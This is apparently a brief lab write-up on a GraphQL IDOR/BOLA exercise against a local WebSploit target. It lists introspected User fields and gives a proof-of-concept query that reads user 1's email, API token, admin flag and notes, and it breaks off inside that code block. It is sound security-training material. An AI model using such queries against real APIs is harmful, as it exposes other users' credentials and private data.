# GraphQL IDOR / BOLA — WebSploit `graphql-galaxy`

## Target

http://127.0.0.1:5023/graphql

## Vulnerabilities

- GraphQL introspection
- Broken Object-Level Authorization (BOLA) / IDOR
- Sensitive information disclosure

## Reconnaissance

GraphQL introspection revealed the `User` type and the following fields:

- id
- username
- email
- apiToken
- isAdmin
- notes

## Proof of Concept

```graphql
{
  user(id: "1") {
    id
    username
    email
    apiToken
    isAdmin
    notes
  }
}
